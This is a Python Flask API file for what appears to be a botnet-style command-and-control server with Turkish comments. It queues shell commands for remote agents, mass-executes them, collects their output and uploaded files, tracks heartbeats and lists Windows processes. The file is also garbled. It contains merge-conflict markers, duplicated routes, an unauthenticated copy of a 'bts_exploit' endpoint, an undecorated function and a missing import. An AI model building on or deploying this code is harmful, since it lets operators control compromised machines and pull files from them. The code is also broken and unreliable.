from datetime import datetime
from flask import Blueprint, request, abort, url_for, render_template, redirect
from werkzeug.utils import secure_filename
from markupsafe import escape
import os

from models import Agent, Command, db
from webui import require_admin

api = Blueprint('api', __name__)

# Dummy geolocation function since pygeoip is unavailable
def geolocation():
    return 'Local'

@api.route('/<agent_id>/push', methods=['POST'])
@require_admin
def push_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    agent.push_command(request.form['cmd'])
    return ''
    
@api.route('/<agent_id>/bts_exploit', methods=['POST'])
@require_admin
def bts_exploit(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    # Get the command from the request
    command = request.json.get('command')
    if command:
        agent.push_command(command)
    return '', 204

=======
@api.route('/<agent_id>/bts_exploit', methods=['POST'])
@require_admin
def bts_exploit(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    # Get the command from the request
    command = request.json.get('command')
    if command:
        agent.push_command(command)
    return '', 204
=======
@api.route('/<agent_id>/bts_exploit', methods=['POST'])
@require_admin
def bts_exploit(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    # Get the command from the request
    command = request.json.get('command')
    if command:
        agent.push_command(command)
    return '', 204
=======
@api.route('/<agent_id>/bts_exploit', methods=['POST'])
def bts_exploit(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    # Get the command from the request
    command = request.json.get('command')
    if command:
        agent.push_command(command)
    return '', 204
def push_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    agent.push_command(request.form['cmd'])
    return ''

@api.route('/<agent_id>/console')
@require_admin
def agent_console(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    return render_template('agent_console.html', agent=agent)

@api.route('/agent_get_commands', methods=['GET'])
def agent_get_commands():
    """
    Agent'ın çalıştırması için bekleyen komutları döndürür
    """
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'commands': []})
  
    # Henüz işlenmemiş komutları al
    commands = Command.query.filter_by(
        agent_id=agent.id, 
        executed=False
    ).order_by(Command.timestamp.asc()).all()
  
    command_list = [{
        'id': c.id,
        'command': c.cmdline,
        'created_at': c.timestamp.isoformat()
    } for c in commands]
  
    return jsonify({'commands': command_list})

@api.route('/agent_response', methods=['POST'])
def agent_response():
    """
    Agent'tan gelen komut çıktılarını işler
    """
    data = request.get_json()
    agent_id = data.get('agent_id')
    command_id = data.get('command_id')
    output = data.get('output')
    error = data.get('error')
    return_code = data.get('return_code')
  
    if not all([agent_id, command_id]):
        return jsonify({'ok': False, 'error': 'Missing parameters'}), 400
  
    # Komutu bul ve güncelle
    command = Command.query.get(command_id)
    if command:
        command.executed = True
        command.output = output
        command.error = error
        command.return_code = return_code
        command.completed_at = datetime.utcnow()
        db.session.commit()
  
    return jsonify({'ok': True})

@api.route('/agent_heartbeat', methods=['POST'])
def agent_heartbeat():
    """
    Agent'ın canlılık sinyallerini alır
    """
    data = request.get_json()
    agent_id = data.get('agent_id')
    status = data.get('status')
  
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        agent.last_seen = datetime.utcnow()
        agent.status = status
        db.session.commit()
  
    return jsonify({'ok': True})

@api.route('/processes', methods=['GET'])
def get_processes():
    """
    Windows işlemlerini listeler
    """
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    # Process listesi komutunu agent'a gönder
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        command = "tasklist /FO CSV /NH"
        agent.push_command(command)
        return jsonify({'ok': True, 'message': 'Process list command queued'})
  
    return jsonify({'ok': False, 'error': 'Agent not found'}), 404



@api.route('/<agent_id>/report', methods=['POST'])
def report_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    out = request.form['output']
    agent.output += escape(out)
    db.session.add(agent)
    db.session.commit()
    return ''

@api.route('/<agent_id>/upload', methods=['POST'])
def upload_file(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    if 'uploaded' in request.files:
        file = request.files['uploaded']
        filename = secure_filename(file.filename)
        agent_dir = agent.agent_id
        store_dir = os.path.join('static/uploads', agent_dir)
        if not os.path.exists(store_dir):
            os.makedirs(store_dir)
        file_path = os.path.join(store_dir, filename)
        while os.path.exists(file_path):
            filename = "_" + filename
            file_path = os.path.join(store_dir, filename)
        file.save(file_path)
        download_link = url_for('webui.uploads', path=agent_dir + '/' + filename)
        agent.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
        db.session.add(agent)
        db.session.commit()
    return ''

@api.route('/agent_get_commands', methods=['GET'])
def agent_get_commands():
    """
    Agent'ın çalıştırması için bekleyen komutları döndürür
    """
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'commands': []})
  
    # Henüz işlenmemiş komutları al
    commands = Command.query.filter_by(
        agent_id=agent.id, 
        executed=False
    ).order_by(Command.timestamp.asc()).all()
  
    command_list = [{
        'id': c.id,
        'command': c.cmdline,
        'created_at': c.timestamp.isoformat()
    } for c in commands]
  
    return jsonify({'commands': command_list})

@api.route('/agent_response', methods=['POST'])
def agent_response():
    """
    Agent'tan gelen komut çıktılarını işler
    """
    data = request.get_json()
    agent_id = data.get('agent_id')
    command_id = data.get('command_id')
    output = data.get('output')
    error = data.get('error')
    return_code = data.get('return_code')
  
    if not all([agent_id, command_id]):
        return jsonify({'ok': False, 'error': 'Missing parameters'}), 400
  
    # Komutu bul ve güncelle
    command = Command.query.get(command_id)
    if command:
        command.executed = True
        command.output = output
        command.error = error
        command.return_code = return_code
        command.completed_at = datetime.utcnow()
        db.session.commit()
  
    return jsonify({'ok': True})

@api.route('/agent_heartbeat', methods=['POST'])
def agent_heartbeat():
    """
    Agent'ın canlılık sinyallerini alır
    """
    data = request.get_json()
    agent_id = data.get('agent_id')
    status = data.get('status')
  
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        agent.last_seen = datetime.utcnow()
        agent.status = status
        db.session.commit()
  
    return jsonify({'ok': True})

@api.route('/processes', methods=['GET'])
def get_processes():
    """
    Windows işlemlerini listeler
    """
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    # Process listesi komutunu agent'a gönder
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        command = "tasklist /FO CSV /NH"
        agent.push_command(command)
        return jsonify({'ok': True, 'message': 'Process list command queued'})
  
    return jsonify({'ok': False, 'error': 'Agent not found'}), 404

@api.route('/mass_execute', methods=['POST'])
@require_admin
def mass_execute():
    """Execute commands on multiple agents or delete selected agents"""
    if 'delete' in request.form:
        # Delete selected agents
        selected_agents = request.form.getlist('selection')
        for agent_id in selected_agents:
            agent = Agent.query.get(agent_id)
            if agent:
                db.session.delete(agent)
        db.session.commit()
    elif 'execute' in request.form and 'cmd' in request.form:
        # Execute command on selected agents
        cmd = request.form['cmd']
        selected_agents = request.form.getlist('selection')
        for agent_id in selected_agents:
            agent = Agent.query.get(agent_id)
            if agent:
                agent.push_command(cmd)
    
    return redirect(url_for('webui.agent_list'))
